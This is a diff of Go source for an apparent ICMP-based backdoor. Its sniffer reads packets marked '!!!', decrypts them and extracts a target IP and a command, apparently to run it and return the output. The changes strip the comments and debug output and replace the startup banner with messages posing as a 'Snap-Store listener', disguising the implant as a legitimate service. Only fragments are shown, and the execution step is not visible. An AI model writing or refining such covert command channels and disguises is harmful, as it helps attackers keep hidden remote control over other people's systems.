@@ -40,11 +40,6 @@ const (
 func GenerateHeader(segment int, segmented bool, ip string) string {
 	SegmentNum := strconv.Itoa(segment)
 	header := "###"
-	// ### is server flag
-	// Value 1 (SSM) is Encryption option
-	// Value 2 is execution option
-	// Value 3 is segment for oversized packets
-	// Value 4 is segment ID
 	if SSM {
 		header += "1"
 	} else {
@@ -61,7 +56,7 @@ func GenerateHeader(segment int, segmented bool, ip string) string {
 		header += "0"
 	}
 	header += SegmentNum
-	header += "[" + ip + "]" // Append IP to header for NAT
+	header += "[" + ip + "]"
 	return header
 }
 
@@ -165,11 +160,9 @@ func sniffer() {
 		if strings.HasPrefix(payload, "!!!") {
 			parts := strings.SplitN(payload, "[", 2)
 
-			// get the part before "["
 			header := parts[0]
 			SetFlags(header)
 
-			// get the part after "["
 			var AfterHeader string
 			if SSM {
 				AfterHeader = decrypt(parts[1])
@@ -177,15 +170,10 @@ func sniffer() {
 				AfterHeader = parts[1]
 			}
 
-			// split the string by "]"
 			parts = strings.Split(AfterHeader, "]")
 
-			// get the part before "]"
 			ip := parts[0]
 
-			// fmt.Println("Header:", header)
-			// fmt.Println("IP:", ip)
-			// fmt.Println("Command:", parts[1])
 			ipLayer := packet.Layer(layers.LayerTypeIPv4)
 			ServerIP, _ := ipLayer.(*layers.IPv4)
 			var out []byte
@@ -210,8 +198,8 @@ func sniffer() {
 }
 
 func main() {
-	fmt.Println("ICMP Service started. Please consult RFC 792 for implementation details.")
-	fmt.Println("For ICMP Service information, consult the Linux Github.")
+	fmt.Println("Snap-Store listener started successfully")
+	fmt.Println("Listener established")
 	go sniffer()
 	for true {
 		time.Sleep(1000 * time.Second)
